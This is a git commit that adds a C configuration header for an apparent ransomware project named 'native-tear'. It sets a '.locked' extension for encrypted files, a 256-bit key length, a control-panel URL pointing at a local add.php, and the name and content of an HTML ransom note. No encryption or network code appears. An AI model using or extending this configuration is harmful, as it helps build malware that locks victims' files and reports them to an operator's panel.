1cd66b1fa37b96a70057e30569b392637512c840
Xrosheart <31621210+YZ-WANG@users.noreply.github.com>
2019-03-20 14:14:19 +0800

    Create config.h

---
+++ src/encrpter/config.h
@@ -0,0 +1,29 @@
+/*
+ * Extension for all locked files
+ */
+#define LOCKED_EXTENSION ".locked"
+
+/*
+ * Key length in bytes, default is 32 (256 bits)
+ */
+#define KEY_LEN 32 // 256 bits
+
+/*
+ * URL to add.php
+ */
+#define URL_PANEL "http://localhost/add.php"
+
+/*
+ * Message to display
+ */
+const char *NOTIFY_MESSAGE = "<p>native-tear</p>";
+
+/*
+ * If notification file should be created
+ */
+#define OPEN_FILE true
+
+/*
+ * Notification file name
+ */
+#define NOTIFY_FILENAME "note.html"
